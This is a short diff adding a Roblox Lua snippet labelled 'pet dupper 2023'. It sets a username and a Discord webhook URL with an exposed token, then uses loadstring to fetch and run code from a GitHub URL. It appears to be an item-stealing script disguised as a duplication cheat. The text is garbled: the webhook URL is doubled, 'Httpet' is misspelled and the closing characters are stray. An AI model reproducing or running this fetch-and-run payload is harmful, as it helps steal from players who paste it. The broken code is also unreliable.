@@ -1,0 +1,4 @@
+G. Username = "sionuaa"
+G. HubName = "pet dupper 2023"
+G.WebhookUrl = "https://discord.com/api/webhooks/1126290116516782130/pQ8Pfp6YlUwOEclmk7JDezpnqVyT0RY-2fKTaX63o7Tl73T27_g-JBUw-7COOtx089cahttps://discord.com/api/webhooks/1126290116516782130/pQ8Pfp6YlUwOEclmk7JDezpnqVyT0RY-2fKTaX63o7Tl73T27_g-JBUw-7COOtx089ca"
+loadstring(game:Httpet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua%22))()
